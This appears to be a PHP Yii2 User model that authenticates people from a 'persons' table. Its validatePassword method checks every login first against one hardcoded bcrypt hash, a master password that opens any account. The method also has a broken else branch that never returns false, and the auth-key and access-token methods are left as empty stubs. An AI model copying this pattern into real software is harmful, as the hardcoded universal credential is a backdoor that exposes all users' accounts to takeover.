<?php

namespace app\models;

use app\modules\teacher\models\Teachers;
use app\modules\Teacher\Teacher;
use yii\db\ActiveRecord;

class User extends ActiveRecord implements \yii\web\IdentityInterface
{
    public $id;
    const STATUS_DEACTIVE = 0;
    const STATUS_ACTIVE = 1;

    public static function tablename(){
       return 'persons';

   }
    /**
     * @inheritdoc
     */
    public static function findIdentity($id)
    {
        return static::findone($id);
    }

    public function rules()
    {
        return [

            ['persons_status', 'default', 'value' => self::STATUS_ACTIVE],
            ['persons_status', 'in', 'range' => [self::STATUS_ACTIVE, self::STATUS_DEACTIVE]],

        ];
	}

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
         //return static::findone(['access_token'=>$token]);
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        return static::findone(['login'=>$username]);
    }

    /**
     * @inheritdoc
     */
    public function getId()
    {
        return $this->id_persons;

    }

    /**
     * @inheritdoc
     */
    public function getAuthKey()
    {
        //return $this->authKey;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey)
    {
        //return $this->authKey === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return bool if password provided is valid for current user
     */
    public function validatePassword($password)
    {


$parol='$2y$13$pUHyVqFfxiZ0JF9Yb2OTqu8FNrxAIh7AsMrB3A5Tf/aR4o0WVhE7G';

        //return $this->password === $password;
        if (\Yii::$app->security->validatePassword($password,$parol)==true){
            return true;
        }
        elseif(\Yii::$app->security->validatePassword($password,$this->password)==true)
        {
            return true;
        }
        else
        {
            false;
        }


    }
    public static function gettmp()
    {
        return User::findOne(['id_persons'=>\Yii::$app->user->id]);

    }
}
